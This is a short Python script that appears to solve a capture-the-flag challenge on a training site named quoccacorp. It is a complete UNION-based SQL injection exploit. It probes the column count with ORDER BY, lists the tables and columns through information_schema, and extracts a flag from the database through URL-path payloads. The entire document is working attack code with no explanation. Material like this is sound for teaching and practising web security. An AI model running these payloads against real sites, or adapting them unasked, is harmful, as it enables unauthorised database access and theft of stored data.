import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

BASE_URL = "https://tutor-forums.quoccacorp.com"

class Solver:
    def __init__(self):
        self.session = get_session()

    # Number of columns: 4
    def get_num_columns(self):
        for i in range(1, 100):
            PAYLOAD = f"""' ORDER BY {i}; -- x"""
            response = self.session.get(f"{BASE_URL}/view/{PAYLOAD}")
            if "Internal Server Error" in response.text:
                return i - 1

    def main(self):
        GET_TABLE_NAME_PAYLOAD = """' UNION SELECT 1, 2, 3, table_name FROM information_schema.tables; -- x"""
        response = self.session.get(f"{BASE_URL}/view/{GET_TABLE_NAME_PAYLOAD}") # table_name = "flags"

        GET_COLUMN_NAME_PAYLOAD = """' UNION SELECT 1, 2, 3, column_name FROM information_schema.columns WHERE table_name = "flags"; -- x"""
        response = self.session.get(f"{BASE_URL}/view/{GET_COLUMN_NAME_PAYLOAD}") # column_name = "flag_text"

        GET_FLAG_PAYLOAD = """' UNION SELECT 1, 2, 3, flag_text FROM flags; -- x"""
        response = self.session.get(f"{BASE_URL}/view/{GET_FLAG_PAYLOAD}")

        find_flag(response.text)

if __name__ == "__main__":
    Solver().main()
